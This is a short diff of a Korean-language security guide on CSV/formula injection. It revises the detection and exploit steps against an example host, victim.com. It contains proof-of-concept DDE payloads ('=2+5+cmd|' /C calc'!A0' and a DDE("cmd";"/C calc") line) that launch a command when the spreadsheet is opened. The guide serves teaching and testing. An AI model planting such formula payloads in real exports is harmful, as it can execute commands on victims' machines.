@@ -31,18 +31,18 @@ Formula Injection 취약점 내 한 종류로 분류되는 CSV Injection은 일�
 사용자 입력 값이 CSV File Download 시 반영되는 지 확인하고, 악성 DDE를 동작시킬 수 있는 특수문자(`-`, `+`, `@`, `=` )가 Cell 가장 앞 부분에 위치할 수 있는 지 확인하면 됩니다.   
 ```Packet
 #Request
-GET /api/csv_export HTTP/1.0
+GET /api/csv_export HTTP/2
 Host: victim.com
 
 #Response
-200 OK
+HTTP/2 200 OK
 
 title
 =2+5+cmd|' /C calc'!A0
 ```
 
 ### Exploit
-탐지한 부분에 악성 DDE를 삽입하여 작동 여부를 살펴보면 됩니다.
+탐지한 부분에 악성 DDE를 삽입 후 다운로드하여 작동 여부를 살펴보면 됩니다.
 ```Excel
 #Basic Payload
 DDE ("cmd";"/C calc";"!A0")A0
